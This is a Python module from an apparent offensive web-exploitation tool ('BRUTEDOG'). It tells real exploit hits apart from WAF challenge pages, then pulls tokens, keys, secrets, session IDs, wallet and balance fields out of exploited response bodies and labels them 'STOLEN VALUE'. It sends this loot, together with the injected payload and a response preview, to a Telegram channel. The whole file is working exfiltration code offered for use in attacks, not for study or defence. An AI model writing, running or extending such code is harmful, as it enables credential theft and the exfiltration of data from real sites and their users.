#!/usr/bin/env python3
"""
TELEMETRY.PY v8.8 — Live Offensive Streamer & Filtered Loot Exfiltration Handler
"""
import asyncio
import json
import re
import sys

from modules.telegram_notifier import send_telegram_alert

CYAN = "\033[96m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
RED = "\033[91m"
RESET = "\033[0m"
BOLD = "\033[1m"
MATRIX_GREEN = "\033[38;5;46m"
NEON_BLUE = "\033[38;5;51m"
MAGENTA = "\033[95m"

CHALLENGE_SIGNATURES = [
    r"<title>\s*security check\s*</title>",
    r"just a moment\.\.\.",
    r"checking your browser",
    r"cf-browser-verification",
    r"cdn-cgi/challenge-platform",
    r"__cf_chl_",
    r"ddos-guard",
    r"incapsula",
    r"sucuri website firewall",
    r"access denied.*cloudflare",
    r"attention required!.*cloudflare",
    r'<meta\s+name=["\']robots["\']\s+content=["\']noindex,\s*nofollow["\']',
]

LOOT_KEY_MARKERS = (
    "token",
    "key",
    "secret",
    "balance",
    "wallet",
    "admin",
    "role",
    "session",
    "user_id",
)

_CHALLENGE_REGEX = re.compile("|".join(CHALLENGE_SIGNATURES), re.IGNORECASE)
_background_tasks: set[asyncio.Task] = set()


def _extract_text_from_proof(proof_data) -> str:
    if isinstance(proof_data, dict):
        parts = []
        for k in ("response_excerpt", "body_sample", "proof", "evidence", "detail", "reason"):
            if k in proof_data and proof_data[k] is not None:
                parts.append(str(proof_data[k]))
        return "\n".join(parts)
    if proof_data is not None:
        return str(proof_data)
    return ""


def is_challenge_or_false_positive(exploit_type, response_body="", proof_data=None) -> tuple[bool, str]:
    """
    Returns (True, reason) if the response looks like a WAF/challenge page,
    generic HTML shell, or unverified hit rather than real exploit proof.
    """
    body_str = response_body if isinstance(response_body, str) else ""
    proof_str = _extract_text_from_proof(proof_data)
    combined = f"{body_str}\n{proof_str}".strip()

    if isinstance(proof_data, dict):
        status = proof_data.get("status")
        if status in (401, 403, 404, 405, 406, 429, 502, 503):
            return True, f"HTTP {status} non-exploit response"

    if _CHALLENGE_REGEX.search(combined):
        return True, "WAF / Security Check challenge page signature detected"

    stripped = combined.lstrip()
    lowered = stripped.lower()
    is_html = lowered.startswith("<!doctype html") or lowered.startswith("<html") or "<head>" in lowered[:400]

    exploit_upper = str(exploit_type or "").upper()
    html_allowed_types = {"XSS", "DOM_XSS", "OPEN_REDIRECT", "CORS_MISCONFIG", "HTML_INJECTION"}
    if is_html and not any(t in exploit_upper for t in html_allowed_types):
        return True, "Generic HTML document returned for non-HTML exploit class"

    return False, ""


async def _send_alert_safe(loot_type, details):
    try:
        await asyncio.wait_for(send_telegram_alert(loot_type, details), timeout=8)
    except Exception:
        pass


def broadcast_tg_alert_sync(loot_type, details):
    """Non-blockingly fires Telegram alerts from synchronous telemetry streams."""
    try:
        loop = asyncio.get_running_loop()
        if not loop.is_closed():
            task = loop.create_task(_send_alert_safe(loot_type, details))
            _background_tasks.add(task)
            task.add_done_callback(_background_tasks.discard)
    except RuntimeError:
        try:
            asyncio.run(_send_alert_safe(loot_type, details))
        except Exception:
            pass


def _collect_loot_keys(node, out: dict, depth: int = 0) -> None:
    if depth > 3 or len(out) >= 25:
        return
    if isinstance(node, dict):
        for k, v in node.items():
            k_str = str(k)
            if any(sub in k_str.lower() for sub in LOOT_KEY_MARKERS) and k_str not in out:
                out[k_str] = v
            if isinstance(v, (dict, list)):
                _collect_loot_keys(v, out, depth + 1)
    elif isinstance(node, list):
        for item in node[:10]:
            if isinstance(item, (dict, list)):
                _collect_loot_keys(item, out, depth + 1)


def extract_valuable_loot(response_body):
    """Parses structured JSON response bodies to harvest high-value fields."""
    looted_assets = {}
    if not response_body or not isinstance(response_body, str):
        return looted_assets

    stripped = response_body.lstrip()
    if stripped.startswith("<"):
        return looted_assets

    try:
        data = json.loads(response_body)
        _collect_loot_keys(data, looted_assets, depth=0)
    except Exception:
        pass

    return looted_assets


def stream_proof(exploit_type, endpoint, payload, response_body, proof_data):
    """
    Filters out WAF challenge pages and false positives before rendering
    verified proof-of-work and broadcasting to Telegram.
    """
    body_str = response_body if isinstance(response_body, str) else str(response_body or "")
    filtered, reason = is_challenge_or_false_positive(exploit_type, body_str, proof_data)
    if filtered:
        sys.stdout.write(
            f"{YELLOW}[~] Suppressed false positive [{exploit_type}] on {endpoint}: {reason}{RESET}\n"
        )
        sys.stdout.flush()
        return False

    sys.stdout.write(
        f"\n{RED}{BOLD}[***] BRUTEDOG V8.8 — LIVE EXPLOIT VERIFIED: {str(exploit_type).upper()} [***]{RESET}\n"
    )
    sys.stdout.write(f"  ├── Target Endpoint : {NEON_BLUE}{endpoint}{RESET}\n")
    sys.stdout.write(f"  ├── Injected Payload: {YELLOW}{json.dumps(payload, default=str)}{RESET}\n")

    auto_loot = extract_valuable_loot(body_str)
    if auto_loot:
        sys.stdout.write(f"  ├── {MAGENTA}AUTOMATED LOOT EXPORT (HIGH-VALUE ASSETS):{RESET}\n")
        for l_key, l_val in auto_loot.items():
            sys.stdout.write(f"  │     └── {CYAN}{l_key}{RESET} : {MATRIX_GREEN}{l_val}{RESET}\n")

    sys.stdout.write("  └── STOLEN VALUE / PROOF:\n")

    proof_dict = {}
    if isinstance(proof_data, dict):
        for k, v in proof_data.items():
            sys.stdout.write(f"      ├── {CYAN}{k}{RESET} : {MATRIX_GREEN}{v}{RESET}\n")
            proof_dict[k] = v
    else:
        sys.stdout.write(f"      └── {MATRIX_GREEN}{str(proof_data)[:300]}{RESET}\n")
        proof_dict["proof"] = str(proof_data)

    sys.stdout.write(f"  └── Response Preview: {GREEN}{body_str[:150]}...{RESET}\n\n")
    sys.stdout.flush()

    telegram_payload = {
        "endpoint": endpoint,
        "payload": str(payload),
        "auto_loot": auto_loot,
        "proof": proof_dict,
        "response_preview": body_str[:300],
    }
    broadcast_tg_alert_sync(f"Verified Exploit Loot [{exploit_type}]", telegram_payload)
    return True
